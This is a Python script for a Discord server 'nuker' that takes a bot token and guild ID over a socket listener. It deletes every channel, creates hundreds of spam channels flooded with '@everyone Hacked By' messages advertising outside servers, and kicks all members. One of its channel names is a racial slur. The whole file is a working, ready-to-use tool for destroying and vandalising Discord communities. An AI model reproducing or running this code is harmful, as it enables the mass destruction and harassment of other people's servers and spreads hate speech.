from os import system
import socket


try: 
    import requests
    import time
    import threading
    import random
    import discord
    from discord.ext import commands
except:
    
    print("Required modules not found, installing them...")
    system("python -m pip install requests")
    system("python -m pip install discord")
    print("All modules installed, please restart the script.")
    input("Press enter to restart...")

# All parameters 
TOKEN = ''
GUILD = ''
server_port = 25567
LINK = 'https://discord.gg/kingstavern https://discord.gg/scansquad  ScanSquad x KingsTavern'
client_socket = ''
MESSAGES = [
    '@everyone Hacked By ' +LINK,
    '@everyone Fucked By ' +LINK,
    '@everyone Owned By '  +LINK,
    '@everyone Nuked By '   +LINK
]
CHANNEL_NAMES = [
    'Hacked',
    'Fucked',
    'Nuked',
    'Nigger'
]

print("Creating server instance...")
def create_and_handle_server():
    global TOKEN, GUILD, client_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", server_port))
    server_socket.listen(1)
    print("Created server instance, now listening for connections...")
    client_socket, client_address = server_socket.accept()
    print(f"Connection from {client_address}")
    TOKEN = client_socket.recv(1024).decode('utf-8')
    print(TOKEN)
    GUILD = int(client_socket.recv(1024).decode('utf-8'))
    print(GUILD)

create_and_handle_server()

headers = {'authorization': f'Bot {TOKEN}'}

def get_all_channels():
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                return

def remove_channel(chnl):
    strike = 0
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                print_to_client_socket(f"[Success] Removed channel: {chnl}")
                return
            else:
                print_to_client_socket(f"[Fail] Cannot remove channel. Status: {r.status_code}. Retrying... Current strike: {strike}")
                strike+=1
                if strike > 3:
                    print_to_client_socket("[Srike] Strike limit has been reached. Quiting thread.")
                    return
    
def channel(name):
    while True:
        json = {'name': name, 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                id = r.json()["id"]
                print_to_client_socket(f"[Success] Created a channel with name: {name} ID: {id}")
                threading.Thread(target=send_message, args=(id,)).start()
                return
            else:
                continue
def send_message(id):
    while True:
        json = {'content': random.choice(MESSAGES)}
        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
def kick_member(id):
    r = requests.delete(f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}', headers=headers)

# Check if the request was successful
    if r.status_code == 204:
        print_to_client_socket(f'[Success] Kicked {id} successfully!')
    else:
        print_to_client_socket(f'Failed to kick member. Status code: {r.status_code}, Response: {r.text}')

def remove_channels():
    for channel_id in channel_ids:
        threading.Thread(target=remove_channel, args=(channel_id,)).start()
        print_to_client_socket("[Thread] Created thread for removing channels")

def spam_channels(CHANNEL_NAME):
    for i in range(20):
        channel(f"{CHANNEL_NAME}")

def kick():
    intents = discord.Intents.all()
    intents.members = True

    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print_to_client_socket(f'Logged in as {bot.user.name}')
        await kick_all_members()

    async def kick_all_members():
        i = 0
        k = 0
        guild_id = GUILD  # Replace with your actual guild ID
        guild = bot.get_guild(guild_id)
        if guild:
            for member in guild.members:
                try:
                    
                    await member.kick(reason="Kicked all members")
                    print_to_client_socket(f'[Success] Kicked: {member.name}#{member.discriminator}')
                    i += 1
                except discord.Forbidden:
                    k += 1
                    print_to_client_socket(f'[Fail] Can\'t kick: {member.name}#{member.discriminator} (Permission Denied)')
            print_to_client_socket(f"[Info] Member kick loop finished, kicked: {i}, failed: {k}, total: {i+k}")
        else:
            print_to_client_socket(f'Guild not found.')


    bot.run(TOKEN)

def kick_wait():
    time.sleep(5)
    kick()
def print_to_client_socket(a):
    print(a)
    client_socket.send(a.encode('utf-8'))



def print_logo():
    print_to_client_socket("""
     _   _       _             
    | \ | |_   _| | _____ _ __ 
    |  \| | | | | |/ / _ \ '__|
    | |\  | |_| |   <  __/ |   
    |_| \_|\__,_|_|\_\___|_|   
                                                       
        Made by kingslin420
    """)
print_logo()

channel_ids = [channel['id'] for channel in get_all_channels()]
if len(channel_ids) != 0:
    remove_channels()
else:
    print_to_client_socket("No channels found.")
threading.Thread(target=kick_wait).start()
for _ in range(500):
    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
    print_to_client_socket("[Thread] Created thread for creating channels")


